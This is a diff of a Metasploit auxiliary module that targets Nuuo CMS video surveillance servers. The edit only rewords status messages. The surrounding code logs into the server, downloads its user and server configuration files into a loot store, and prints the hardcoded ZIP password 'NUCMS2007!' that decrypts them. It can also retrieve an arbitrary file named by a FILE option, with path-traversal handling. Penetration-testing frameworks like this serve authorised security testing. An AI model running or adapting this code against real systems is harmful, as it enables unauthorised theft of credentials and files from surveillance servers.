@@ -55,36 +55,36 @@ class MetasploitModule < Msf::Auxiliary
     login
 
     if @session == nil
-      fail_with(Failure::Unknown, "#{peer} - Failed to login to Nuuo CMS")
+      fail_with(Failure::Unknown, "Failed to login to Nuuo CMS")
     end
 
     cmserver = download_file('CMServer.cfg', true)
     # Once zip extraction is working change application/zip to text/plain
     path = store_loot("CMServer.cfg", "application/zip", datastore['RHOST'],
                       cmserver, 'CMServer.cfg', "Nuuo CMS user configuration file")
-    print_good("#{peer} - Downloaded Nuuo CMS user configuration file to #{path}")
+    print_good("Downloaded Nuuo CMS user configuration file to #{path}")
 
     serverconfig = download_file('ServerConfig.cfg', true)
     # Once zip extraction is working change application/zip to text/plain
     path = store_loot("ServerConfig.cfg", "application/zip", datastore['RHOST'],
                       serverconfig, 'ServerConfig.cfg', "Nuuo CMS server configuration file")
-    print_good("#{peer} - Downloaded Nuuo CMS server configuration file to #{path}")
+    print_good("Downloaded Nuuo CMS server configuration file to #{path}")
 
     # note that when (if) archive/zip is included in msf, the code in the Nuuo mixin needs to be changed
     # see the download_file method for details
-    print_status("#{peer} - The user and server configuration files were stored in the loot database.")
-    print_status("#{peer} - The files are ZIP encrypted, and due to the lack of the archive/zip gem, \
+    print_status("The user and server configuration files were stored in the loot database.")
+    print_status("The files are ZIP encrypted, and due to the lack of the archive/zip gem, \
 they cannot be decrypted in Metasploit.")
-    print_status("#{peer} - You will need to open them up with zip or a similar utility, and use the \
+    print_status("You will need to open them up with zip or a similar utility, and use the \
 password NUCMS2007! to unzip them.")
-    print_status("#{peer} - Annoy the Metasploit developers until this gets fixed!")
+    print_status("Annoy the Metasploit developers until this gets fixed!")
 
     if datastore['FILE'] != nil
       filedata = download_file(datastore['FILE'])
       filename = datastore['FILE'].gsub('..\\', '')
       path = store_loot(filename, "application/octet-stream", datastore['RHOST'],
                         filedata, filename, "File downloaded from Nuuo CMS server")
-      print_good("#{peer} - Downloaded #{filename} to #{path}")
+      print_good("Downloaded #{filename} to #{path}")
     end
   end
 end
